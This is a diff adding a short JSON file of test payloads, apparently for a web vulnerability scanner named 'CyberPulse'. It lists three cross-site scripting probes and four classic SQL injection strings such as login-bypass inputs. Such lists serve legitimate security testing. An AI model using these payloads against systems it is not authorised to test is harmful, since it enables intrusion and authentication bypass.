@@ -1,0 +1,13 @@
+{
+  "xss": [
+    "<script>alert('CyberPulse_XSS')</script>",
+    "\"><script>alert('CyberPulse_XSS')</script>",
+    "<img src=x onerror=alert('CyberPulse_XSS')>"
+  ],
+  "sqli": [
+    "' OR '1'='1",
+    "' OR 1=1 --",
+    "\" OR 1=1 --",
+    "admin' --"
+  ]
+}
